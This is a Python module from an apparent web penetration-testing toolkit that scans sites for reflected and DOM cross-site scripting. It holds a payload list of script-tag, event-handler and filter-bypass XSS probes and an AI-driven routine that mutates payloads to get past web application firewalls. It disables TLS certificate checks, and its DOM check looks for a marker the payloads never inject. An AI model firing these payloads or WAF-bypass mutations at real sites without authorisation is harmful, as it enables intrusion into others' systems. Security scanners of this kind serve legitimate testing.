#!/usr/bin/env python3
"""
XSS Scanner Module
-------------------
Tests for:
  • Reflected XSS (GET/POST forms)
  • DOM XSS indicators
  • HTML attribute injection
  • Script tag injection
"""

import uuid
import requests
import concurrent.futures
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from pathlib import Path
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

console = Console()

# Unique session marker — changes every run to prevent false-positives
# from cached content or pages that contain these strings by default.
_SESSION_MARKER = f"WPXSS_{uuid.uuid4().hex[:12].upper()}"

XSS_PAYLOADS = [
    # Basic reflection check (marker injected at runtime)
    f"<script>alert('{_SESSION_MARKER}')</script>",
    f"<img src=x onerror=alert('{_SESSION_MARKER}')>",
    f"<svg/onload=alert('{_SESSION_MARKER}')>",
    # Attribute breakout
    f"\" onmouseover=\"alert('{_SESSION_MARKER}')",
    f"' onmouseover='alert('{_SESSION_MARKER}')',",
    f'"><img src=x onerror=alert("{_SESSION_MARKER}")>',
    # Tag injection
    f"<body onload=alert('{_SESSION_MARKER}')>",
    f"<details open ontoggle=alert('{_SESSION_MARKER}')>",
    f"<input onfocus=alert('{_SESSION_MARKER}') autofocus>",
    f"<video><source onerror=alert('{_SESSION_MARKER}')>",
    # Filter bypass
    f"<ScRiPt>alert('{_SESSION_MARKER}')</ScRiPt>",
    f"<script >alert('{_SESSION_MARKER}')</script >",
    f"javascript:alert('{_SESSION_MARKER}')",
    # URL-encoded
    f"%3Cscript%3Ealert('{_SESSION_MARKER}')%3C%2Fscript%3E",
    # Double-encoded
    f"%253Cscript%253Ealert('{_SESSION_MARKER}')%253C%252Fscript%253E",
]

# Reflection check: we look for the session-unique marker only
REFLECTION_MARKERS = [_SESSION_MARKER]


class XSSScanner:
    """Reflected & DOM XSS scanner."""

    PAYLOAD_FILE = Path(__file__).parents[2] / "wordlists" / "payloads" / "xss.txt"

    def __init__(self, target: str, threads: int = 10, timeout: int = 10, session=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers["User-Agent"] = (
                "WebPwnToolkit/2.0 (Authorized Security Testing)"
            )
            self.session.verify = False
        self.results: List[Dict] = []

    # ── Load payloads ──────────────────────────────────────────────────

    def _load_payloads(self) -> List[str]:
        if self.PAYLOAD_FILE.exists():
            with open(self.PAYLOAD_FILE, encoding="utf-8") as f:
                extra = [l.strip() for l in f if l.strip()]
            return list(set(XSS_PAYLOADS + extra))
        return XSS_PAYLOADS

    # ── Crawl forms ────────────────────────────────────────────────────

    def _extract_forms(self, url: str) -> List[Dict]:
        forms = []
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, "lxml")
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                inputs = {}
                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name")
                    itype = inp.get("type", "text").lower()
                    if name and itype not in ("submit", "button", "hidden", "image"):
                        inputs[name] = "test"
                forms.append(
                    {
                        "url": urljoin(url, action) or url,
                        "method": method,
                        "inputs": inputs,
                    }
                )
        except Exception:
            pass
        return forms

    # ── Test single field + payload ────────────────────────────────────

    def _test_payload(
        self, url: str, method: str, params: Dict, field: str, payload: str
    ) -> Optional[Dict]:
        test_params = params.copy()

        # Lazy load AI Engine
        try:
            from modules.ai.ai_engine import AIEngine

            ai = AIEngine()
        except ImportError:
            ai = None

        # Fetch page once to determine semantic HTML context for Generative Fuzzing
        context = ""
        if ai:
            try:
                temp_resp = self.session.get(url, timeout=5, verify=False)
                context = temp_resp.text
                # Generate a context-aware smart payload specifically for this field
                smart_payloads = ai.generate_smart_payloads(context, field, "XSS")
                if smart_payloads:
                    payload = smart_payloads[0]  # Try the best matching AI payload
            except:
                pass

        test_params[field] = payload

        def do_request(curr_payload):
            test_params[field] = curr_payload
            if method == "post":
                return self.session.post(
                    url, data=test_params, timeout=self.timeout, verify=False
                )
            else:
                return self.session.get(
                    url, params=test_params, timeout=self.timeout, verify=False
                )

        try:
            resp = do_request(payload)

            # --- [AI] Reinforcement Learning WAF Bypass ---
            if ai and resp.status_code in (403, 406):
                console.print(
                    f"  [dim yellow][WAF] Blocked '{payload}'. AI Agent mutating...[/dim yellow]"
                )
                mutated = ai.mutate_payload_for_waf(payload, resp.status_code)
                try:
                    resp = do_request(mutated)
                    if resp.status_code == 200:
                        console.print(
                            f"  [bold green][AI] WAF Bypassed with: {mutated}[/bold green]"
                        )
                        payload = mutated
                except Exception:
                    pass

            body = resp.text

            # --- [AI] NLP False Positive Filter ---
            if ai and ai.is_false_positive(body, payload, "XSS"):
                return None

            # Check if payload or key marker reflected back unescaped
            for marker in REFLECTION_MARKERS:
                if marker in body:
                    # Check if the marker is inside actual HTML execution context, not just raw text
                    if (
                        "<script" in body.lower()
                        or "on" in payload.lower()
                        or "<svg" in payload.lower()
                    ):
                        return {
                            "url": url,
                            "method": method.upper(),
                            "parameter": field,
                            "payload": payload,
                            "evidence": marker,
                            "type": "Reflected XSS",
                            "severity": "high",
                            "detail": f"Payload reflected unescaped in response for param '{field}'",
                            "owasp": "A03:2021 – Injection",
                            "cvss": 7.4,
                            "remediation": (
                                "Encode all user-supplied output with context-aware encoding "
                                "(HTML-encode, JS-encode). Implement a strict Content-Security-Policy."
                            ),
                        }

            # DOM XSS indicator: payload appears in script/event contexts
            soup = BeautifulSoup(body, "lxml")
            for script in soup.find_all("script"):
                if "WEBPWN_XSS_MARKER_12345" in (script.string or ""):
                    return {
                        "url": url,
                        "method": method.upper(),
                        "parameter": field,
                        "payload": payload,
                        "evidence": "Marker in <script> block",
                        "type": "DOM XSS (possible)",
                        "severity": "high",
                        "detail": f"Unescaped marker found inside <script> tag for param '{field}'",
                        "owasp": "A03:2021 – Injection",
                        "cvss": 7.4,
                        "remediation": (
                            "Avoid placing user data in JS contexts. "
                            "Use JSON.stringify or safe DOM APIs."
                        ),
                    }

        except Exception:
            pass

        return None

    # ── Test URL GET params ────────────────────────────────────────────

    def _test_url_params(self, payloads: List[str]) -> List[Dict]:
        parsed = urlparse(self.target)
        qs = parse_qs(parsed.query)
        if not qs:
            return []

        findings = []
        for field in qs:
            for payload in payloads:
                params = {k: v[0] for k, v in qs.items()}
                result = self._test_payload(self.target, "get", params, field, payload)
                if result and result not in findings:
                    findings.append(result)
        return findings

    # ── Public run ─────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        from modules.recon.crawler import WebCrawler

        payloads = self._load_payloads()
        console.print(f"  [dim]-> {len(payloads)} XSS payloads loaded[/dim]")
        console.print(f"  [dim]-> Session marker: {_SESSION_MARKER}[/dim]")

        # ── Crawl to discover all forms and endpoints ──────────────────
        crawl = WebCrawler(
            self.start_url if hasattr(self, "start_url") else self.target,
            threads=self.threads,
            timeout=self.timeout,
        ).run()
        forms = crawl["forms"]
        endpoints = crawl["endpoints"]
        console.print(
            f"  [dim]-> {len(forms)} form(s) | {len(endpoints)} param endpoint(s)[/dim]"
        )

        all_tests = []
        # Forms (with CSRF passthrough)
        for form in forms:
            all_params = {**form.get("hidden", {}), **form["inputs"]}
            for field in form["inputs"]:
                for payload in payloads:
                    all_tests.append(
                        (
                            form["url"],
                            form["method"],
                            all_params,
                            field,
                            payload,
                        )
                    )

        # Parameterised endpoints from crawler
        from urllib.parse import parse_qs, urlparse

        for ep_url in endpoints:
            qs = parse_qs(urlparse(ep_url).query)
            for field in qs:
                params = {k: v[0] for k, v in qs.items()}
                for payload in payloads:
                    all_tests.append((ep_url, "get", params, field, payload))

        # Original target URL params
        url_findings = self._test_url_params(payloads)
        self.results.extend(url_findings)

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]XSS scanning...[/cyan]"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("xss", total=len(all_tests))
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {
                    ex.submit(self._test_payload, *args): args for args in all_tests
                }
                for future in concurrent.futures.as_completed(futures):
                    progress.advance(task)
                    result = future.result()
                    if result and result not in self.results:
                        self.results.append(result)

        console.print(
            f"  [{'red' if self.results else 'green'}]"
            f"{'⚠ ' + str(len(self.results)) + ' XSS vulnerability(ies) found!' if self.results else '✅ No XSS found'}"
            f"[/]"
        )
        return self.results
